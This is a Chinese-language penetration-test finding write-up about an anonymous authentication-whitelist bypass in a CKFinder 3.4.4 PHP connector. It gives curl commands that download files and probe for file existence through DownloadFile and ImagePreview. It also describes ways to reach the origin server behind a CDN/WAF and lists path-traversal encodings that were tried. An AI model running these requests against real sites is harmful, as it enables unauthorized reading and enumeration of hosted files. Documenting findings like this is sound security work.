# CKFinder 3.4.4 connector 认证白名单绕过：匿名 DownloadFile / ImagePreview 读取后端根内文件

- 归类：auth-validate control → auth-bypass
- 严重度：low
- 组件/版本：CKFinder 3.4.4（PHP connector）
- 来源：task#4 全流程，finding_id=145（finding_checks.verdict=verified，findings.status=confirmed）
- 关联：同任务源站的 Basic 路径级绕过条目（id 556）——本条入口同样走「直连源站、绕边缘 CDN/WAF」的测试面，但机制不同（CKFinder 自身认证门，而非 Apache Basic）。

## 原理

CKFinder 3 PHP connector 的站级 authentication 被配置为「命令白名单」：普通命令（Init / GetFiles / GetFolders / FileUpload / QuickUpload / SaveImage / ImageEdit / Proxy 等）一律返回

```http
HTTP/400
{"error":{"number":500,"message":"The file browser is disabled for security reasons. Please contact your system administrator and check the CKFinder configuration file."}}
```

但匿名 GET 的 `command=DownloadFile` 与 `command=ImagePreview` 命中白名单，不做身份校验直接执行：

- 可读取该 connector 两个 backend 根（`type=Images` → `/userdata/images/`；`type=Files` → `/userdata/files/`）内、且后缀在资源类型白名单内的文件；
- `currentFolder` 支持多级子目录；
- `ImagePreview` 支持服务端缩放（`size`）；
- 错误响应会回显 `resourceType` / `currentFolder`（含 `path`、`acl`、`url`），可泄露后端路径与权限位；
- 可用「名称非法（102）／合法但不存在」的错误差异做目录与文件存在性 oracle。

仅匿名读：无上传/写入通道，路径穿越被校验封死；Images 目录中的文件通常本身也可直连，因此实际增量主要是「枚举上传目录 + 读取未在页面暴露的文件」，判低危。

## 前置条件

1. 能访问 CKFinder 3 PHP connector（本例为 `/plugins/ckfinder/core/connector/php/connector.php`，路径随站点集成方式而定）。
2. 无需任何 Cookie / 登录态。
3. 目标把 authentication 配成命令白名单（DownloadFile / ImagePreview 在匿名放行集合内）；并非所有 CKFinder 实例都这样，必须先做基线对照。
4. 若前面有 CDN/WAF，需要能直连源站 IP（`--noproxy '*'`、`-k`、必要时 `--http1.0`）。

## 复现步骤

### 0) 基线：证明门确实在（否则不叫「绕过」）

```bash
curl -sk --noproxy '*' --http1.0 \
  -H 'Host: TARGET_HOST' \
  'https://TARGET_IP/plugins/ckfinder/core/connector/php/connector.php?command=Init'
```

期望 `HTTP 400`、body 约 171B：

```json
{"error":{"number":500,"message":"The file browser is disabled for security reasons. Please contact your system administrator and check the CKFinder configuration file."}}
```

用 GetFiles / GetFolders / FileUpload / QuickUpload / SaveImage / ImageEdit / Proxy 等命令复核，应同样全部 400（本例 25 个命令类同）。

### 1) 绕过：匿名下载后端根内文件

```bash
curl -sk --noproxy '*' --http1.0 -D - -o test.png \
  -H 'Host: TARGET_HOST' \
  'https://TARGET_IP/plugins/ckfinder/core/connector/php/connector.php?command=DownloadFile&type=Images&currentFolder=%2F&fileName=test.png'
```

期望：

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream; name="test.png"
Content-Disposition: attachment; filename="test.png"
```

且下载文件 md5 与直连后端 URL（如 `https://TARGET_IP/userdata/images/test.png`）完全相同 —— 这是「读到真实文件」而非错误页/占位页的硬判据。

### 2) 多级子目录同样可读

```bash
curl -sk --noproxy '*' --http1.0 -o bg.jpg \
  -H 'Host: TARGET_HOST' \
  'https://TARGET_IP/plugins/ckfinder/core/connector/php/connector.php?command=DownloadFile&type=Images&currentFolder=Shopping%20Worlds%2FBackGrounds&fileName=HP-Site-Background-NOV21-06.jpg'
# 期望：200 + 145530B JPEG
```

### 3) 第二个绕过命令：ImagePreview（服务端缩放生效）

```bash
curl -sk --noproxy '*' --http1.0 -D - -o prev.png \
  -H 'Host: TARGET_HOST' \
  'https://TARGET_IP/plugins/ckfinder/core/connector/php/connector.php?command=ImagePreview&type=Images&currentFolder=%2F&fileName=test.png&size=1x1'
# 期望：200 + Content-Type: image/png + 输出为 1x1（91B）
```

### 4) 目录/文件存在性 oracle

对同一 `currentFolder` 换 `fileName`、以及同一根下换 `currentFolder`，比较错误号/文案：

- 名称非法（含 `..`、`/`、`%00` 等）→ `400 {"error":{"number":102,"message":"Invalid file or folder name."}}`
- 合法名称但不存在 → 另一种错误

两者可区分 ⇒ 可匿名判断上传目录与文件是否存在。

## 判据（同时成立才算命中）

1. 基线命令 400 + 「The file browser is disabled for security reasons」（门存在且对普通命令生效）。
2. DownloadFile 返回 200 + `Content-Disposition: attachment`，且内容 md5 与直连后端文件一致。
3. ImagePreview 返回 200 图片且 `size` 生效（输出尺寸符合请求）。
4. 全程无 Cookie / Authorization，同一匿名会话即可完成。

## 限制 / 已证否（别再试）

- **无上传/写入**：`command=FileUpload` → 400 disabled；`PUT /plugins/ckfinder/userfiles/...`、`PUT /userdata/images/...` → 405；POST multipart 不落盘，投放的标记文件直访 404。
- **无路径穿越**：`fileName` / `currentFolder` 的 `../`、`%2e%2e%2f`、双重编码、`..%5c`、`%00`、UTF-8 变体全部 `400 error 102 Invalid file or folder name`，读取范围被限定在 backend 根内。
- **后缀白名单**：`type=Files` 排除 php/phtml/phar/inc 等；`/userdata` 下的 `.php/.phtml/.phar/.php5/.php7/.pht/.phps` 直访恒 403（.htaccess 拒绝）⇒ 不能升级为脚本驻留。
- **不是通用 CKFinder 漏洞**：能否命中取决于站点 authentication 命令白名单的具体配置；先做 Init vs DownloadFile 对照，不要盲打。

## 失败时的常见原因

- connector 路径不对 → 404；按站点集成方式找实际 connector（插件目录或独立 ckfinder 目录）。
- authentication 对所有命令统一 false → 所有命令（含 DownloadFile/ImagePreview）都 400，此路不通。
- 目标命令不在站点白名单 → 该命令 400；换命令或放弃。
- `type` 名不对（非 Images/Files）→ 资源类型错误；从页面/JS 配置或错误回显里找实际 type。
- 后缀不在白名单 → 被拒；先用已知存在的图片等白名单后缀验证通道。
- 前面有 CDN/WAF 拦截 → 需直连源站；老 nginx/Apache 用 `--http1.0`，本机代理用 `--noproxy '*'`。
- 站点已加固：authentication 收敛为统一校验后，DownloadFile 也返回 400。

## 版本指纹（确认 3.4.4）

比对官方 `ckfinder_php_3.4.4` 包内 `ckfinder.js`：`size=514553`、`md5=71789bd104a98cefcec8548ba87569c0`。若目标静态资源可直接取，可按同法坐实小版本，再用对应源码核对 connector 的 authentication / 命令白名单行为。

## 影响

匿名读取 backend 根内白名单后缀文件（可进多级子目录）+ 上传目录/文件存在性枚举。若上传目录存在未在页面暴露的敏感文件（备份、未发布素材、带元数据的图片等），信息价值上升；本例未发现可写/穿越，且 Images 文件可直连，故判 low。